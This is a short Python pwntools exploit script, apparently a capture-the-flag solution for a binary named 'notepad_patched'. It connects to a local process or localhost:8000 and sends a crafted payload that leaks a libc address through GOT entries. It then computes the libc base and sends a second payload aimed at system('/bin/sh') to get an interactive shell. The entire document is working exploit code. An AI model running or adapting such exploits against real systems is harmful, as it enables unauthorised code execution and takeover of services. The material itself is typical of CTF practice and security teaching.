#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad_patched")
libc = ELF("./libc-2.31.so")
# ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p)
            pause()
    else:
        p = remote("localhost", 8000)

    return p


def main():
    p = conn()

    # good luck pwning :)
    payload = flat(
        exe.sym.main, 0,
        8,
        exe.got.gets,
        exe.got.exit,
    )
    p.sendline(payload)
    p.recvuntil("Received\n")
    leak = u64(p.recvline().strip().ljust(8, b"\x00")) - libc.sym.gets
    print(hex(leak))
    libc.address = leak

    payload = flat(
        libc.sym.system, 0,
        8,
        next(libc.search(b"/bin/sh")),
        exe.got.puts,
    )
    p.sendline(payload)

    p.interactive()


if __name__ == "__main__":
    main()
